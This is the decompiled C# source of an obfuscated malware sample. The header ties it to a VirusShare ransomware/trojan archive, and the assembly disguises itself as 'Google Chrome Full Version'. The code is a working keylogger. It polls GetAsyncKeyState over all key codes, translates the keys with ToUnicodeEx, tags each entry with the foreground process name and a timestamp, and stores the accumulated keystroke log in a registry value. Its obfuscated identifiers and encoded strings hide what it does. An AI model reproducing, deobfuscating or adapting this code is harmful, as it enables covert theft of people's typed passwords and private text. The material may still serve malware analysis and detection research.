// Decompiled with JetBrains decompiler
// Type: j.nqcpjoekzw
// Assembly: Google Chrome Full Version, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8024666E-1682-4571-A2AC-033F4530F911
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-b772a931021ad63094de28fb08477220cef8fdf31237fb24fb8c08d4bca34175.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ⴄ;

namespace j
{
  public class nqcpjoekzw
  {
    public string xvlvjtynqs;
    public string hnqgptcoqq;
    internal static ႰႷ Ⴓ;
    internal static char[] Ⴃ;
    private ႰႳ.Ⴅ Ⴗ;

    public nqcpjoekzw()
    {
      this.Ⴗ.Ⴅ = Keys.None;
      this.xvlvjtynqs = ႰႰ.ႥႥ.Ⴃ(0, '\u000F', 515359217);
      this.hnqgptcoqq = Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(0, '\u00B9', 515359084), 63603), 62180), 63125);
    }

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    private static extern int Ⴄ(
      [In] uint obj0,
      [In] uint obj1,
      [In] byte[] obj2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      [In] int obj4,
      [In] uint obj5,
      [In] IntPtr obj6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    private static extern bool Ⴈ([In] byte[] obj0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    private static extern uint Ⴍ([In] uint obj0, [In] uint obj1);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Ⴃ([In] IntPtr obj0, [In] ref int obj1);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Ⴐ([In] int obj0);

    [DllImport("user32.dll", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short Ⴗ([In] int obj0);

    private string Ⴐ()
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      char[] ⴃ = nqcpjoekzw.Ⴃ;
      IComparable comparable;
      try
      {
        int num1 = 17;
        IntPtr num2;
        int num3;
        object obj1;
        object obj2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = !(ႰႰ.Ⴀ(ref num2, 'Ƿ', (short) 498) == this.Ⴗ.Ⴓ & ႰႰ.Ⴜ<string, string>(this.Ⴗ.Ⴄ, ႰႰ.ႥႥ.ႨႰ<Process>((Process) obj1, '£', 'ú'), false, 997, 'α') == 0 | pebdynyveq.Ⴀ<string>(ႰႰ.ႥႥ.ႨႰ<Process>(obj1 as Process, 'ė', 'Ŏ'), (short) 849, 870) == 0) ? (int) ⴗ[29] - 209 : (int) ⴗ[18] - 168;
              continue;
            case 1:
              string[] strArray = (string[]) obj2;
              DateTime dateTime = iolzjmgwdl.Ⴅ(269, (short) 293);
              string str = ႰႰ.ႥႥ.ႨႠ<string>(ref dateTime, Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(5, '\u009E', 515359094), 61427), 60156), 62323), 'Ǿ', (short) 430);
              strArray[1] = str;
              num1 = (int) ⴗ[12];
              continue;
            case 2:
              obj1 = (object) ႰႰ.Ⴃ(num3, 400, 420);
              num1 = (int) ⴃ[290] - 53791;
              continue;
            case 3:
              nqcpjoekzw.Ⴃ(num2, ref num3);
              goto case 5;
            case 4:
              ((string[]) obj2)[0] = Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(8, 'D', 515359101), 62675), 58280), 62332);
              num1 = (int) ⴃ[204] - 10830;
              continue;
            case 5:
              num1 = (int) ⴃ[319] - 6222;
              continue;
            case 6:
              this.Ⴗ.Ⴓ = ႰႰ.Ⴀ(ref num2, 'ˆ', (short) 707);
              num1 = 15;
              continue;
            case 7:
              (obj2 as string[])[2] = ႰႰ.ႥႥ.ႨႰ<Process>((Process) obj1, 'Ȓ', 'Ɉ');
              num1 = 10;
              continue;
            case 8:
              num1 = 14;
              continue;
            case 9:
              (obj2 as string[])[4] = this.Ⴗ.Ⴄ;
              num1 = (int) ⴗ[12] + 5;
              continue;
            case 10:
              ((string[]) obj2)[3] = Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(0, '£', 515359120), 58324), 57549), 62676);
              goto case 16;
            case 11:
              goto label_21;
            case 12:
              ((string[]) obj2)[5] = Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(8, 'K', 515359055), 60321), 61361), 61989);
              goto case 8;
            case 13:
              obj2 = (object) new string[6];
              num1 = (int) ⴗ[198] - 47;
              continue;
            case 14:
              goto label_19;
            case 15:
              this.Ⴗ.Ⴄ = ႰႰ.ႥႥ.ႨႰ<Process>((Process) obj1, 'ͷ', '̮');
              num1 = 13;
              continue;
            case 16:
              num1 = 9;
              continue;
            default:
              num2 = Ⴄ.Ⴐ.Ⴈ();
              num1 = 3;
              continue;
          }
        }
label_19:
        comparable = (IComparable) string.Concat((string[]) obj2);
        goto label_23;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_21:
      switch (0)
      {
        case 2:
        case 4:
          break;
        default:
          return ႰႰ.ႥႥ.Ⴃ(6, '·', 515359223);
      }
label_23:
      return comparable as string;
    }

    private static string Ⴃ([In] uint obj0)
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      char[] ⴃ = nqcpjoekzw.Ⴃ;
      IEnumerable enumerable;
      try
      {
        int num1 = 9;
        object obj;
        Array array;
        bool flag;
        IntPtr num2;
        uint num3;
        int num4;
        IntPtr num5;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 7;
              continue;
            case 1:
              num1 = (int) ⴗ[147] - (int) ⴗ[98];
              continue;
            case 2:
              num1 = 12;
              continue;
            case 3:
              num1 = (int) ⴃ[151] - 25238;
              continue;
            case 4:
              num2 = Ⴄ.Ⴐ.Ⴈ();
              num1 = 13;
              continue;
            case 5:
              num3 = nqcpjoekzw.Ⴍ(obj0, 0U);
              num1 = (int) ⴗ[210] - 154;
              continue;
            case 6:
              nqcpjoekzw.Ⴄ(obj0, num3, array as byte[], obj as StringBuilder, 5, 0U, num5);
              num1 = (int) ⴗ[221] - 176;
              continue;
            case 7:
              flag = nqcpjoekzw.Ⴈ((byte[]) array);
              goto case 2;
            case 8:
              goto label_6;
            case 10:
              num5 = ႰႰ.ႥႥ.ႨႭ(nqcpjoekzw.Ⴐ(num4), (short) 179, (short) 212);
              goto case 3;
            case 11:
              goto label_16;
            case 12:
              num1 = flag ? 5 : (int) ⴃ[268] - 49836;
              continue;
            case 13:
              IntPtr num6 = num2;
              int num7 = 0;
              ref int local = ref num7;
              num4 = nqcpjoekzw.Ⴃ(num6, ref local);
              num1 = (int) ⴃ[218] - 11828;
              continue;
            default:
              obj = (object) new StringBuilder();
              array = (Array) new byte[(int) byte.MaxValue];
              goto case 0;
          }
        }
label_6:
        enumerable = (IEnumerable) ႰႰ.ႥႥ.Ⴃ(1, 'L', 515359216);
        goto label_20;
label_16:
        enumerable = (IEnumerable) ႰႰ.ႭႰ<StringBuilder>(obj as StringBuilder, 374, 323);
        goto label_20;
      }
      catch (Exception ex)
      {
        ႰႰ.ႥႥ.ႨႤ<Exception>(ex, (short) 85, 'g');
        ProjectData.ClearProjectError();
      }
      switch (1)
      {
        case 0:
        case 2:
        case 4:
          break;
        default:
          return ((Keys) checked ((int) obj0)).ToString();
      }
label_20:
      return (string) enumerable;
    }

    private string Ⴀ([In] Keys obj0)
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      char[] ⴃ = nqcpjoekzw.Ⴃ;
label_3:
      bool flag = ႰႰ.ႭႭ<Keyboard>(iolzjmgwdl.Ⴀ<Computer>(Ⴄ.Ⴐ.Ⴓ, 249, (short) 147), 'ˮ', 670);
label_12:
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 0:
            if (ႰႰ.ႭႭ<Keyboard>(iolzjmgwdl.Ⴀ<Computer>(Ⴄ.Ⴐ.Ⴓ, 958, (short) 980), '̆', 887))
            {
              num1 = 9;
              continue;
            }
            goto label_13;
          case 1:
            num1 = (int) ⴃ[34] - 46701;
            continue;
          case 2:
          case 6:
            num1 = !flag ? 1 : (int) ⴃ[227] - 10231;
            continue;
          case 3:
            goto label_10;
          case 4:
            goto label_13;
          case 7:
            num1 = 3;
            continue;
          case 8:
            goto label_3;
          case 9:
            num1 = 2;
            continue;
          case 10:
            goto label_11;
          case 11:
            goto label_12;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (nqcpjoekzw.Ⴀ);
            num1 = (int) ⴗ[142] - 246;
            continue;
        }
      }
label_10:
      flag = false;
      goto label_13;
label_11:
      flag = true;
label_13:
      IComparable<string> comparable;
      try
      {
        int num2 = 27;
        Keys keys;
        while (true)
        {
          switch (num2)
          {
            case 0:
              num2 = (int) ⴃ[168] - 25398;
              continue;
            case 1:
              num2 = 36;
              continue;
            case 2:
              num2 = (int) ⴃ[257] - 31984;
              continue;
            case 3:
              num2 = 31;
              continue;
            case 4:
              num2 = keys == Keys.F3 ? 24 : (int) ⴗ[44] - 180;
              continue;
            case 5:
              num2 = 9;
              continue;
            case 6:
              num2 = keys == Keys.F4 ? (int) ⴗ[161] + 14 : 48;
              continue;
            case 7:
              num2 = keys == Keys.F11 ? 24 : (int) ⴗ[141] - 42;
              continue;
            case 8:
              num2 = keys == Keys.Shift ? (int) ⴃ[280] - 35358 : 5;
              continue;
            case 9:
            case 59:
              num2 = keys == Keys.ShiftKey ? 24 : (int) ⴗ[110] - 233;
              continue;
            case 10:
              num2 = keys != Keys.Space ? 33 : (int) ⴗ[20] - 88;
              continue;
            case 11:
              num2 = (int) ⴗ[178];
              continue;
            case 12:
              num2 = keys == Keys.Return ? (int) ⴗ[83] - 159 : (int) ⴃ[234] - 39710;
              continue;
            case 13:
              goto label_73;
            case 14:
              num2 = 24;
              continue;
            case 15:
              num2 = (int) ⴗ[147] - 122;
              continue;
            case 16:
              num2 = keys == Keys.RControlKey ? (int) ⴗ[188] / 4 : (int) ⴃ[246] - 12450;
              continue;
            case 17:
              num2 = (int) ⴃ[197] - 44887;
              continue;
            case 18:
              num2 = (int) ⴃ[178] - 41789;
              continue;
            case 19:
              num2 = 22;
              continue;
            case 20:
              num2 = 53;
              continue;
            case 21:
              num2 = keys != Keys.Back ? (int) ⴗ[154] - 107 : (int) ⴗ[118] * 2;
              continue;
            case 22:
              num2 = keys != Keys.Tab ? (int) ⴃ[350] - 30716 : 45;
              continue;
            case 23:
              num2 = keys != Keys.Return ? 19 : (int) ⴃ[99] - 48360;
              continue;
            case 24:
            case 52:
              goto label_44;
            case 25:
              num2 = keys == Keys.F2 ? (int) ⴃ[96] - 61538 : (int) ⴃ[17] - 20271;
              continue;
            case 26:
              num2 = keys == Keys.RShiftKey ? (int) ⴃ[151] - 25220 : (int) ⴃ[54] - 7348;
              continue;
            case 28:
              num2 = keys != Keys.End ? 44 : (int) ⴃ[317] - 39372;
              continue;
            case 29:
              num2 = 13;
              continue;
            case 30:
              num2 = keys == Keys.Alt ? (int) ⴗ[195] - 126 : (int) ⴗ[105] - 23;
              continue;
            case 31:
              num2 = !flag ? 29 : (int) ⴗ[81];
              continue;
            case 32:
              num2 = keys == Keys.F9 ? 24 : 46;
              continue;
            case 33:
              num2 = 12;
              continue;
            case 34:
              num2 = 38;
              continue;
            case 35:
              num2 = keys == Keys.Delete ? 38 : (int) ⴗ[81] - 2;
              continue;
            case 36:
              goto label_62;
            case 37:
              goto label_49;
            case 38:
              goto label_18;
            case 39:
              int num3 = ႰႰ.ႭႷ<string, string>(this.xvlvjtynqs, Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(8, '=', 515359067), 59162), 59354), 58914), (short) 648, (short) 696) ? 1 : 0;
              Ⴜ.Ⴗ[10] = (byte) ((int) Ⴜ.Ⴗ[10] + (int) Ⴜ.Ⴗ[150] & 100);
              num2 = num3 == 0 ? 20 : 1;
              continue;
            case 40:
            case 51:
              goto label_68;
            case 41:
              num2 = keys == Keys.ControlKey ? 24 : (int) ⴗ[22] / 8;
              continue;
            case 42:
              num2 = keys == Keys.LControlKey ? 24 : 30;
              continue;
            case 43:
              num2 = keys == Keys.F1 ? 24 : (int) ⴃ[37] - 63355;
              continue;
            case 44:
              num2 = 10;
              continue;
            case 45:
              num2 = (int) ⴗ[198];
              continue;
            case 46:
              num2 = keys == Keys.F10 ? (int) ⴗ[7] - 59 : 7;
              continue;
            case 47:
              num2 = keys == Keys.F7 ? (int) ⴃ[312] - 13041 : (int) ⴗ[167] + 4;
              continue;
            case 48:
              num2 = keys == Keys.F5 ? 24 : 50;
              continue;
            case 49:
              num2 = 39;
              continue;
            case 50:
              num2 = keys == Keys.F6 ? 24 : 47;
              continue;
            case 53:
              goto label_63;
            case 54:
              num2 = keys == Keys.LShiftKey ? 24 : (int) ⴃ[142] - 54345;
              continue;
            case 55:
              num2 = 21;
              continue;
            case 56:
              num2 = keys == Keys.Control ? 24 : 41;
              continue;
            case 57:
              num2 = (int) ⴗ[113] - 138;
              continue;
            case 58:
              num2 = keys == Keys.F8 ? (int) ⴗ[103] - 186 : 32;
              continue;
            case 60:
              goto label_72;
            case 61:
              num2 = keys == Keys.F12 ? 24 : (int) ⴃ[21] - 49778;
              continue;
            default:
              keys = obj0;
              num2 = 35;
              continue;
          }
        }
label_18:
        comparable = (IComparable<string>) ႰႳ.Ⴐ<string, string, string>(Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(6, 'ô', 515359051), 58274), 63584), 59262), pebdynyveq.ႷႭ<Enum>((Enum) obj0, '\u001E', (short) 1), Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(7, '»', 515359054), 62119), 61672), 61534), '¦', 165);
        goto label_80;
label_44:
        comparable = (IComparable<string>) ႰႰ.ႥႥ.Ⴃ(4, 'Ñ', 515359221);
        goto label_80;
label_49:
        comparable = (IComparable<string>) Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(5, 'ÿ', 515359125), 58324), 57549), 62676);
        goto label_80;
label_62:
        comparable = (IComparable<string>) ႰႰ.ႥႥ.Ⴃ(2, '\u0084', 515359219);
        goto label_80;
label_63:
        comparable = (IComparable<string>) Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(7, 'd', 515359060), 59162), 59354), 58914);
        goto label_80;
label_68:
        comparable = (IComparable<string>) Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(3, 'Í', 515359030), 59992), 60263), 60821);
        goto label_80;
label_72:
        comparable = (IComparable<string>) pebdynyveq.ႷႷ<string>(nqcpjoekzw.Ⴃ(checked ((uint) obj0)), (short) 21, '0');
        goto label_80;
label_73:
        comparable = (IComparable<string>) nqcpjoekzw.Ⴃ(checked ((uint) obj0));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          switch (3)
          {
            case 0:
              ProjectData.ClearProjectError();
              goto label_80;
            case 1:
              goto label_79;
            case 2:
            case 4:
              break;
            default:
              comparable = (IComparable<string>) Strings.ChrW((int) obj0).ToString().ToUpper();
              goto case 0;
          }
        }
        char ch = Strings.ChrW((int) obj0);
label_79:
        comparable = (IComparable<string>) ch.ToString().ToLower();
        ProjectData.ClearProjectError();
      }
label_80:
      return (string) comparable;
    }

    public void jrkxxoagwi()
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      char[] ⴃ = nqcpjoekzw.Ⴃ;
      this.xvlvjtynqs = ႰႰ.ႥႥ.ႨႳ<object>(Ⴄ.Ⴐ.Ⴃ(this.hnqgptcoqq, (object) ႰႰ.ႥႥ.Ⴃ(4, 'ÿ', 515359221)), 17, 116);
      try
      {
        int num1 = 7;
        int num2;
        int num3;
        Keys keys;
        IComparable<string> comparable;
        int num4;
        while (true)
        {
          switch (num1)
          {
            case 0:
              checked { ++num3; }
              num1 = num3 <= (int) byte.MaxValue ? (int) ⴗ[206] + 1 : (int) ⴗ[120] - 84;
              continue;
            case 1:
              this.Ⴗ.Ⴅ = keys;
              num1 = 0;
              continue;
            case 2:
              num1 = !(nqcpjoekzw.Ⴗ(num3) == (short) -32767 & !ႰႰ.ႭႭ<Keyboard>(iolzjmgwdl.Ⴀ<Computer>(Ⴄ.Ⴐ.Ⴓ, 945, (short) 987), 'Ș', 618)) ? (int) ⴗ[168] - (int) ⴗ[168] : 5;
              continue;
            case 3:
              this.xvlvjtynqs = iolzjmgwdl.Ⴍ<string, string>(this.xvlvjtynqs, (string) comparable, (short) 656, (short) 715);
              num1 = 1;
              continue;
            case 4:
            case 6:
              Thread.Sleep(1);
              num1 = 11;
              continue;
            case 5:
            case 16:
              keys = (Keys) num3;
              comparable = (IComparable<string>) this.Ⴀ(keys);
              num1 = pebdynyveq.Ⴀ<string>(comparable as string, (short) 185, 142) <= 0 ? 1 : (int) ⴗ[21] / 2;
              continue;
            case 8:
              num2 = 0;
              num4 = checked (pebdynyveq.Ⴀ<string>(Ⴜ.Ⴓ(ႰႳ.Ⴃ(ႰႰ.Ⴅ(ႰႰ.ႥႥ.Ⴃ(0, 'Ç', 515358981), 59938), 61082), 57379), (short) 854, 878) * 1024);
              num1 = 10;
              continue;
            case 9:
              num1 = num2 != 1000 ? 6 : (int) ⴗ[150] - 192;
              continue;
            case 10:
              num1 = pebdynyveq.Ⴀ<string>(this.xvlvjtynqs, (short) 87, 96) <= num4 ? (int) ⴃ[65] - 40179 : 12;
              continue;
            case 11:
            case 13:
              checked { ++num2; }
              num3 = 0;
              num1 = 2;
              continue;
            case 12:
              this.xvlvjtynqs = this.xvlvjtynqs.Remove(0, checked (this.xvlvjtynqs.Length - num4));
              num1 = (int) ⴃ[344] - 878;
              continue;
            case 14:
              Ⴄ.Ⴐ.Ⴐ(this.hnqgptcoqq, (object) this.xvlvjtynqs, RegistryValueKind.String);
              num1 = 6;
              continue;
            case 15:
              this.xvlvjtynqs = iolzjmgwdl.Ⴍ<string, string>(this.xvlvjtynqs, this.Ⴐ(), (short) 90, (short) 1);
              num1 = 3;
              continue;
            default:
              num2 = 0;
              num1 = (int) ⴗ[217] / 9;
              continue;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      switch (2)
      {
      }
    }
  }
}
